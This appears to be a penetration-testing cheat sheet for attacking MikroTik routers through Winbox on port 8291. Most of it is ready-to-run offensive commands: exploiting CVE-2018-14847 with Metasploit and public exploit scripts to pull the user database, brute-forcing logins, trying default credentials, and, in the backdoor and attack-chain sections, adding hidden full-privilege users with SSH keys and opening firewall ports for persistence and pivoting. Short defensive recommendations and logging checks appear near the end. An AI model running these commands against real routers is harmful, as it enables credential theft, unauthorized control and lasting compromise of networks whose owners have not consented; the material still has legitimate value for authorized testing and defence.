# MIKROTIK WINBOX ENUMERATION (Port 8291/TCP)

## SERVICE OVERVIEW
```
MikroTik Winbox - Proprietary router management protocol
- Port: 8291/TCP
- Binary protocol for MikroTik RouterOS
- Used by Winbox GUI application
- Critical vulnerabilities (CVE-2018-14847, CVE-2019-3976)
- Can reveal credentials, configurations, router access
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p8291 <IP>                            # Service/Version detection
nc -nv <IP> 8291                                # Manual connection (binary protocol)
```

## NMAP ENUMERATION
```bash
# MikroTik detection
nmap -sV -p8291 <IP>                            # Version detection
nmap -p8291 --script mikrotik-routeros-brute <IP>  # Brute force

# RouterOS version detection
nmap -p8291 -sV <IP> | grep -i mikrotik

# Comprehensive scan
nmap -sV -p8291,80,443,8728,8729 <IP> -oA mikrotik_scan
# 80/443 - Web interface (WebFig)
# 8291 - Winbox
# 8728 - API
# 8729 - API-SSL
```

## MIKROTIK ROUTEROS VULNERABILITIES
```bash
# CVE-2018-14847: Directory traversal (password disclosure)
# Allows reading arbitrary files, including user database

# CVE-2019-3976: Router OS SMB buffer overflow
# Allows remote code execution

# CVE-2019-3977: Stack exhaustion DoS

# CVE-2021-41987: Memory corruption (RCE)
```

## CVE-2018-14847 EXPLOITATION (DIRECTORY TRAVERSAL)
```bash
# Exploit allows reading /pckg/user.dat (user database)
# Contains usernames and passwords

# Metasploit module
msfconsole
use auxiliary/gather/mikrotik_winbox_fileread
set RHOSTS <IP>
set RPORT 8291
run

# Manual exploitation with Python
git clone https://github.com/BasuCert/WinboxExploit
cd WinboxExploit
python3 winboxexploit.py <IP> <outfile>

# Alternative tool
git clone https://github.com/BigNerd95/WinboxExploit
python winbox_exploit.py <IP>

# Output will contain user.dat file
# Decode user.dat to get credentials
```

## DECODE USER.DAT
```bash
# After extracting user.dat:

# MikroTik password decoder
git clone https://github.com/mkbrutusproject/MKBRUTUS
cd MKBRUTUS
python mkbrutus.py -t <IP> -u admin -p <password_from_userdat>

# Manually decode user.dat
# Passwords are stored in salted MD5 hashes
# Format: username:md5(salt + password)

# Extract credentials
strings user.dat
# Look for:
# - Usernames
# - MD5 hashes
# - Salts
```

## WINBOX CLIENT CONNECTION
```bash
# Download Winbox
wget https://download.mikrotik.com/routeros/winbox/3.40/winbox64.exe

# Run Winbox (Windows or Wine on Linux)
wine winbox64.exe

# Connection details:
# - Connect To: <IP>
# - Login: admin (default)
# - Password: <blank> or <cracked_password>
# - Port: 8291 (default)

# Connect via Winbox
# Click "Connect"
# If successful, full GUI access to router configuration
```

## BRUTE FORCE ATTACKS
```bash
# Nmap brute force
nmap -p8291 --script mikrotik-routeros-brute --script-args userdb=users.txt,passdb=passwords.txt <IP>

# Hydra (limited support)
hydra -l admin -P passwords.txt <IP> winbox

# MKBRUTUS (MikroTik-specific brute forcer)
git clone https://github.com/mkbrutusproject/MKBRUTUS
cd MKBRUTUS
python mkbrutus.py -t <IP> -u admin -w passwords.txt

# Default credentials to try:
admin:<blank>
admin:admin
admin:password
admin:MikroTik
```

## ROUTEROS API ACCESS (PORT 8728/8729)
```bash
# If Winbox (8291) is blocked, try API ports
# 8728 - RouterOS API (plaintext)
# 8729 - RouterOS API-SSL

# Python RouterOS API library
pip install routeros-api

# Python script to connect
cat > routeros_connect.py <<'EOF'
from routeros_api import RouterOsApiPool

connection = RouterOsApiPool(
    '<IP>',
    username='admin',
    password='<password>',
    port=8728,
    plaintext_login=True
)
api = connection.get_api()

# Execute commands
resources = api.get_resource('/system/resource')
print(resources.get())

connection.disconnect()
EOF

python3 routeros_connect.py
```

## WEB INTERFACE (WEBFIG)
```bash
# MikroTik routers also have web interface
# Check ports 80 and 443

curl http://<IP>/
curl https://<IP>/ -k

# Default credentials
# Username: admin
# Password: <blank>

# Login via web interface
# http://<IP>/webfig/
# https://<IP>/webfig/

# Brute force web login
hydra -l admin -P passwords.txt <IP> http-get /webfig/
```

## POST-EXPLOITATION (AFTER WINBOX ACCESS)
```bash
# After connecting via Winbox or API:

# System information
/system resource print
/system identity print
/system routerboard print

# User accounts
/user print
/user export                                    # Export user config

# Network configuration
/ip address print                               # IP addresses
/ip route print                                 # Routing table
/interface print                                # Network interfaces
/ip firewall filter print                       # Firewall rules

# Wireless configuration
/interface wireless print

# Backup configuration
/export file=config                             # Export entire config
/file print                                     # List files
# Download config.rsc via FTP or SCP
```

## CREATE BACKDOOR USER
```bash
# Via Winbox GUI or CLI:

# Add administrative user
/user add name=backdoor password=Backdoor123! group=full

# Add SSH key for backdoor
/user ssh-keys import public-key-file=backdoor_key.pub user=backdoor

# Enable SSH if not already enabled
/ip service enable ssh
/ip service set ssh port=2222                   # Alternative port

# Add firewall rule to allow access
/ip firewall filter add chain=input protocol=tcp dst-port=2222 action=accept
```

## COMMON MISCONFIGURATIONS
```
☐ Default admin account with blank password
☐ Winbox accessible from internet
☐ Outdated RouterOS vulnerable to CVE-2018-14847
☐ No firewall rules restricting management access
☐ Weak passwords on admin accounts
☐ SSH enabled with password authentication
☐ No intrusion detection/prevention
☐ RouterOS not updated regularly
☐ API (8728/8729) exposed to internet
```

## VULNERABILITY SCANNING
```bash
# Check for CVE-2018-14847
python winbox_exploit.py <IP>

# Nmap vuln scan
nmap -p8291 --script vuln <IP>

# Metasploit scanner
use auxiliary/scanner/mikrotik/mikrotik_routeros_fileread
set RHOSTS <IP>
run

# searchsploit
searchsploit mikrotik
searchsploit routeros
```

## QUICK WIN CHECKLIST
```
☐ Scan for Winbox on port 8291
☐ Test default credentials (admin:<blank>)
☐ Check for CVE-2018-14847 (directory traversal)
☐ Extract user.dat if vulnerable
☐ Decode passwords from user.dat
☐ Brute force admin account if needed
☐ Connect via Winbox client
☐ Enumerate router configuration
☐ Create backdoor user for persistence
☐ Export full configuration
☐ Check for other MikroTik services (API, WebFig)
```

## ONE-LINER EXPLOITATION
```bash
# Quick CVE-2018-14847 exploit
python winbox_exploit.py <IP> && strings user.dat

# Nmap detection + brute force
nmap -sV -p8291 --script mikrotik-routeros-brute --script-args userdb=users.txt,passdb=passwords.txt <IP>
```

## SECURITY IMPLICATIONS
```
RISKS:
- Full router compromise (CVE-2018-14847, CVE-2019-3976)
- Credential theft (user.dat extraction)
- Network topology disclosure
- Man-in-the-Middle (routing manipulation)
- Persistent backdoor (rogue user accounts)
- Internet traffic redirection
- VPN configuration theft
- Firewall rule manipulation
- DoS (router reboot, config wipe)

ATTACK CHAIN:
1. Scan for Winbox (port 8291)
2. Exploit CVE-2018-14847 (directory traversal)
3. Extract user.dat (user database)
4. Decode passwords from user.dat
5. Connect via Winbox with admin credentials
6. Export full router configuration
7. Create backdoor user
8. Modify firewall/routing for persistence
9. Pivot to internal network
10. Exfiltrate data via router

RECOMMENDATIONS:
- Update RouterOS to latest version (patch CVE-2018-14847)
- Disable Winbox access from internet
- Use strong passwords for all accounts
- Implement firewall rules (allow management from trusted IPs only)
- Enable RouterOS audit logging
- Use VPN for remote management
- Disable unused services (API, WebFig, etc.)
- Regular configuration backups
- Monitor for unauthorized changes
- Implement network segmentation
```

## MIKROTIK PORTS OVERVIEW
```
8291 - Winbox (binary protocol)
8728 - RouterOS API (plaintext)
8729 - RouterOS API-SSL
80   - HTTP (WebFig)
443  - HTTPS (WebFig)
21   - FTP (file transfer)
22   - SSH (CLI access)
23   - Telnet (CLI access - insecure)
8080 - HTTP proxy (if configured)
```

## TOOLS
```bash
# Winbox client (Windows/Wine)
wget https://download.mikrotik.com/routeros/winbox/3.40/winbox64.exe

# Winbox exploits
git clone https://github.com/BasuCert/WinboxExploit
git clone https://github.com/BigNerd95/WinboxExploit

# MKBRUTUS (brute forcer)
git clone https://github.com/mkbrutusproject/MKBRUTUS

# Metasploit
use auxiliary/gather/mikrotik_winbox_fileread

# RouterOS API library
pip install routeros-api

# Nmap
nmap -p8291 --script mikrotik-* <IP>
```

## DEFENSE DETECTION
```bash
# Monitor for suspicious Winbox activity:
# - Connections from untrusted IPs
# - Brute force attempts (multiple failed logins)
# - Configuration changes
# - New user accounts created
# - Unusual file access patterns

# RouterOS logging
/log print
/log print where topics~"system,error,critical"

# Check for unauthorized users
/user print

# Check for config changes
/system history print

# Enable detailed logging
/system logging add topics=info,warning,error,critical action=remote remote=<syslog_server>
```

## INTEGRATION WITH OTHER ATTACKS
```bash
# Attack chain:

# 1. Discover MikroTik router
nmap -sV -p8291 <IP>

# 2. Exploit CVE-2018-14847
python winbox_exploit.py <IP>

# 3. Decode user.dat
strings user.dat > credentials.txt

# 4. Connect via Winbox
wine winbox64.exe
# Login with extracted credentials

# 5. Export configuration
/export file=fullconfig
# Download fullconfig.rsc

# 6. Analyze config for:
# - VPN credentials
# - Firewall rules
# - Network topology
# - Connected devices

# 7. Create persistence
/user add name=backdoor password=Pwn3d! group=full

# 8. Pivot to internal network
# Use router as jump point
# Access internal subnets via routing manipulation
```
